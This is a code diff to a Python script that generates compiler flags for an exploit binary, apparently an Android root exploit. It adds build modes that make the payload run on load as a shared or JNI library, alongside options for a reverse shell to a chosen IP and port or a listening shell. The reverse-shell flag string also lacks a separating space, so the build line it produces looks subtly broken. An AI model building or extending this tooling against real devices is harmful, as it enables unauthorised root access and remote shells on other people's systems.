@@ -10,7 +10,12 @@ def main():
         description='Generates CFLAGS for exploit binary',
     )
 
+    entrypoint_group = parser.add_mutually_exclusive_group(required=True)
     payload_group = parser.add_mutually_exclusive_group(required=True)
+
+    entrypoint_group.add_argument('--static', action='store_true', help='Build binary as static executable')
+    entrypoint_group.add_argument('--shared', action='store_true', help='Build binary as shared library which calls the main on load')
+    entrypoint_group.add_argument('--jni', action='store_true', help='Build binary as a JNI shared library which calls main on JNI load')
 
     payload_group.add_argument('--reverse-shell', action='store_true')
     payload_group.add_argument('--listening-shell', action='store_true')
@@ -30,9 +35,16 @@ def main():
     if args.shell:
         flags = ''
     elif args.listening_shell:
-        flags = f'-DROOT_PAYLOAD_PORT={args.port}'
+        flags = f'-DLISTENING_SHELL -DROOT_PAYLOAD_PORT={args.port} '
     elif args.reverse_shell:
-        flags = f'-DROOT_PAYLOAD_PORT={args.port} -DROOT_PAYLOAD_IP={args.ip}'
+        flags = f'-DREVERSE_SHELL -DROOT_PAYLOAD_PORT={args.port} -DROOT_PAYLOAD_IP={args.ip}'
+
+    if args.static:
+        flags += '-static -fno-pie -DEXPLOIT_STATIC'
+    elif args.shared:
+        flags += '-shared -llog -DEXPLOIT_SHARED'
+    elif args.jni:
+        flags += '-shared -llog -DEXPLOIT_JNI'
 
     common_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
     print(f'-I{common_dir} {flags}')
